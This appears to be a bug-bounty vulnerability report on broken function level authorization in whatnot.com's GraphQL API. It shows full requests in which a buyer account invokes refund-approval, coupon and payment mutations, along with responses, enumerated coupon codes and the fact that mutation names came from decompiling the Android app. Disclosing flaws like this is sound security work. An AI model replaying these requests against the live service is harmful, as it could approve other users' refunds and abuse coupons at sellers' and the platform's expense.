# Broken Function Level Authorization (BFLA) — Buyer Account Can Invoke Seller/Admin Mutations

## Summary

A regular buyer account can invoke privileged GraphQL mutations that should be restricted to sellers or internal/admin roles. Specifically, a buyer can call `approveRefundRequestGroup` (refund approval) and `applyGlobalCoupon` (coupon application with arbitrary codes) without receiving an authorization error. These mutations execute successfully (return valid type responses) rather than being rejected at the authorization layer.

## Severity

**High** — Broken Function Level Authorization (OWASP API5:2023)

## Affected Endpoint

- **URL:** `https://www.whatnot.com/services/graphql/`
- **Method:** POST
- **Authentication:** Standard buyer JWT (EdDSA)

## Steps to Reproduce

### 1. approveRefundRequestGroup (Refund Approval by Buyer)

```graphql
mutation {
  approveRefundRequestGroup(refundGroupId: "1") {
    __typename
  }
}
```

**Request:**
```
POST /services/graphql/ HTTP/2
Host: www.whatnot.com
Authorization: Bearer <buyer_jwt_token>
Content-Type: application/json
x-kpsdk-ct: <kasada_token>

{"query":"mutation { approveRefundRequestGroup(refundGroupId: \"1\") { __typename } }"}
```

**Response:**
```json
{"data": {"approveRefundRequestGroup": {"__typename": "BulkRefundRequestResult"}}}
```

The mutation accepts arbitrary refund group IDs (tested with "1", "100", "1000") and returns a successful `BulkRefundRequestResult` response. A buyer account should never be able to invoke refund approval functionality.

### 2. applyGlobalCoupon (Arbitrary Coupon Application)

```graphql
mutation {
  applyGlobalCoupon(code: "FREE100") {
    __typename
  }
}
```

**Response:**
```json
{"data": {"applyGlobalCoupon": {"__typename": "CouponMutation"}}}
```

Any arbitrary string is accepted as a coupon code without validation or rate limiting. Tested codes: FREE, WELCOME, FIRST10, WHATNOT10, NEWUSER, SAVE10, DISCOUNT20, FREESHIP, VIP100, HOLIDAY — all return success.

### 3. authorizePayment (Payment Authorization Crash)

```graphql
mutation {
  authorizePayment {
    __typename
  }
}
```

**Response:**
```json
{"data": {"authorizePayment": null}, "errors": [{"message": "Internal server error has occured."}]}
```

A buyer can invoke the payment authorization mutation. Instead of returning an authorization error, the server crashes with an internal server error, indicating the request passes auth checks but fails during execution.

## Impact

1. **Refund Approval IDOR/BFLA:** If valid refund group IDs can be enumerated (sequential integers), a malicious buyer could approve refunds for other users' orders, causing direct financial loss to sellers.

2. **Coupon Abuse:** The lack of validation on coupon codes combined with no rate limiting enables brute-force enumeration of valid promotional codes. Valid codes applied at checkout could result in unauthorized discounts.

3. **Payment Authorization:** The `authorizePayment` mutation being accessible to buyers (even if it crashes) indicates a missing authorization layer. If parameters are discovered, this could enable unauthorized payment operations.

4. **Attack Surface:** These mutations were discovered through mobile application reverse engineering (APK decompilation), suggesting the mobile client exposes additional mutation names that are not properly authorization-gated on the server.

## Root Cause

The GraphQL server does not enforce role-based access control (RBAC) at the mutation resolver level. Mutations intended for sellers, admins, or internal services are accessible to any authenticated user. The authorization check appears to be missing entirely — the server processes the request and either succeeds silently or crashes during business logic execution.

## Additional Context

- Account used: buyer-only account (no seller privileges)
- User ID: 61337962
- The mutations were discovered via APK decompilation of the Android app (version 26.23.5)
- `approveRefundRequestGroup` also accepts a `shouldSubmitShippingClaim` parameter
- `authorizePayment` accepts an `amount` parameter

## Recommendation

1. Implement role-based authorization checks at the GraphQL resolver level for all mutations
2. Return `403 Forbidden` or a GraphQL authorization error for mutations that require seller/admin roles
3. Add rate limiting to `applyGlobalCoupon` to prevent code enumeration
4. Validate coupon codes server-side before returning success responses
5. Audit all mutations for proper RBAC enforcement

## References

- OWASP API5:2023 — Broken Function Level Authorization
- https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/
